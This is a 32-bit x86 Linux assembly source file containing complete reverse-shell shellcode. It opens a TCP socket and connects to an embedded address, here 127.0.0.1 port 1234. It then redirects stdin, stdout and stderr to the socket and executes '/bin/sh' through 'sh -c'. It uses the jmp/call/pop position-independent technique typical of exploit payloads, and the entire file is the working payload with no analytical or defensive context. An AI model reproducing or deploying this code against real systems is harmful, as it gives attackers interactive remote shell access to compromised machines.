/*
 * Copyright 2014 Joseph Landry
 */

.section .text
.global _start

.set IPPROTO_TCP,6
.set SOCK_STREAM,1
.set AF_INET,2
.set SYS_socketcall,102
.set SYS_SOCKET,1
.set SYS_CONNECT,3
.set SOCK_SIZE,16
.set SYS_dup2,63
.set SYS_execve,11
.set SYS_exit,1

_start:
	jmp	end

begin:
	popl	%esi

socket:
	pushl	$IPPROTO_TCP
	pushl	$SOCK_STREAM
	pushl	$AF_INET
	movl	%esp,%ecx	
	movl	$SYS_SOCKET,%ebx	
	movl	$SYS_socketcall,%eax
	int	$0x80
	add	$0xC,%esp

	cmpl	$0,%eax
	jl	exit1

	mov	%eax,%edi

connect:
	pushl	$SOCK_SIZE
	pushl	%esi
	pushl	%edi
	movl	%esp,%ecx
	movl	$SYS_CONNECT,%ebx
	movl	$SYS_socketcall,%eax
	int	$0x80
	add	$0xC,%esp

	cmp	$0,%eax
	jnz	exit1

dup2:
	mov	$0,%ecx			# newfd
	mov	%edi,%ebx		# oldfd
	mov	$SYS_dup2,%eax
	int	$0x80

	inc	%ecx
	mov	$SYS_dup2,%eax
	int	$0x80

	inc	%ecx
	mov	$SYS_dup2,%eax
	int	$0x80

	add	$8,%esi

build_argv:	
	pushl	$0			# argv[n] = NULL
	movl	%esi, %eax
	jmp	2f

1:
	add	$1, %eax
2:
	cmpb	$0, (%eax)
	jz	continue
	pushl	%eax			# argv[n]
3:
	cmpb	$0, (%eax)
	jz	1b
	add	$1, %eax
	jmp	3b

continue:
	pushl	$0x0			#envp[0] = NULL
	
	movl	%esp, %edx		# char *envp[]
	lea	0x4(%esp), %ecx		# char *argv[]
	movl	(%ecx), %ebx		# char *filename
	movl	$SYS_execve,%eax	# sys_execve()
	int	$0x80

exit1:
	movl	$SYS_exit,%eax
	movl	$1,%ebx
	int	$0x80

end:
	call begin

addr:
.short	2
.short	0xD204
.byte	127,0,0,1
.ascii "sh\000"
.ascii "-c\000"
.ascii "/bin/sh\000\000"
